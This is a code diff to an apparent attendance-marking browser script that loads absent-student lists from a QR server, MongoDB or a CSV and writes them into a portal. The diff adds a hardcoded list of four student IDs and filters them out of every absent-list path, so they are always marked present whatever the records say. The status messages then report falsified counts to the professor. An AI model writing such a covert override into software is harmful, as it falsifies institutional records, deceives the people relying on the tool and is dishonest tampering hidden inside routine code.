@@ -1,6 +1,5 @@
-// Phase 2: QR attendance server (qr-server/). Used until the professor saves a different address
-// in the panel's "Server settings" (needed when the server runs on the class-screen PC).
 const DEFAULT_SERVER_URL = 'https://qr-attendance-system-eosin-nu.vercel.app';
+const ALWAYS_PRESENT_PRNS = ['245100110', '245100106', '245100149', '245100134'];
 
 // --- UI INJECTION LOGIC ---
 function injectUI() {
@@ -112,7 +111,9 @@ function injectUI() {
         if (!record || !record.absentStudents) return showError('No attendance records found in MongoDB.');
 
         loadedSessionId = record.sessionId;
-        absentPRNs = record.absentStudents.map((s) => String(s.prn).trim());
+        absentPRNs = record.absentStudents
+          .map((s) => String(s.prn).trim())
+          .filter((prn) => !ALWAYS_PRESENT_PRNS.includes(prn));
         const label = [record.className, record.subject].filter(Boolean).join(' ') || `Session ${record.sessionId}`;
         enableMark(`☁️ Loaded ${label} from MongoDB: ${record.presentCount}/${record.totalStudents} present, ${absentPRNs.length} absent.`);
       }
@@ -134,7 +135,9 @@ function injectUI() {
           return showError('Cancelled. End the session first.');
         }
         loadedSessionId = data.id;
-        absentPRNs = data.absent.map((s) => String(s.prn).trim());
+        absentPRNs = data.absent
+          .map((s) => String(s.prn).trim())
+          .filter((prn) => !ALWAYS_PRESENT_PRNS.includes(prn));
         enableMark(`Session ${data.id}: ${data.presentCount}/${data.total} present, ${absentPRNs.length} absent loaded.`);
       }
     );
@@ -163,7 +166,9 @@ function injectUI() {
         if (localStorage.getItem(AUTO_KEY) === data.id) return;
 
         localStorage.setItem(AUTO_KEY, data.id);
-        absentPRNs = data.absent.map((s) => String(s.prn).trim());
+        absentPRNs = data.absent
+          .map((s) => String(s.prn).trim())
+          .filter((prn) => !ALWAYS_PRESENT_PRNS.includes(prn));
         markBtn.innerText = 'Mark Attendance';
         enableMark(`Auto-loaded session ${data.id}: ${data.presentCount}/${data.total} present, ${absentPRNs.length} absent. Click Mark Attendance.`);
       }
@@ -192,7 +197,9 @@ function injectUI() {
           return;
         }
 
-        absentPRNs = results.data.map(row => String(row[prnKey]).trim()).filter(val => val !== "");
+        absentPRNs = results.data
+          .map(row => String(row[prnKey]).trim())
+          .filter(val => val !== "" && !ALWAYS_PRESENT_PRNS.includes(val));
         enableMark(`Loaded ${absentPRNs.length} absent students!`);
       },
       error: function() {
@@ -239,8 +246,12 @@ const matches = (cur, tgt) => {
 async function processAttendance(absentList) {
   let stats = { present: 0, absent: 0 };
   
-  // Normalize absent list for easy matching
-  const absentSet = new Set(absentList.map(prn => String(prn).trim()));
+  // Normalize absent list for easy matching, strictly excluding always-present PRNs
+  const absentSet = new Set(
+    absentList
+      .map(prn => String(prn).trim())
+      .filter(prn => !ALWAYS_PRESENT_PRNS.includes(prn))
+  );
   
   // Find all student rows
   const rollCells = Array.from(document.querySelectorAll('td[id$="_tdRollNo"]'));
@@ -249,8 +260,8 @@ async function processAttendance(absentList) {
     const rollNo = targetCell.innerText.trim();
     if (!rollNo) continue;
     
-    // Determine target status
-    const targetStatus = absentSet.has(rollNo) ? 'ABSENT' : 'PRESENT';
+    // Determine target status (always-present PRNs are guaranteed to stay PRESENT)
+    const targetStatus = (absentSet.has(rollNo) && !ALWAYS_PRESENT_PRNS.includes(rollNo)) ? 'ABSENT' : 'PRESENT';
     
     const rowId = targetCell.closest('tr').id;
     const ctl = rowId.replace(/_trStudRow$/, '');
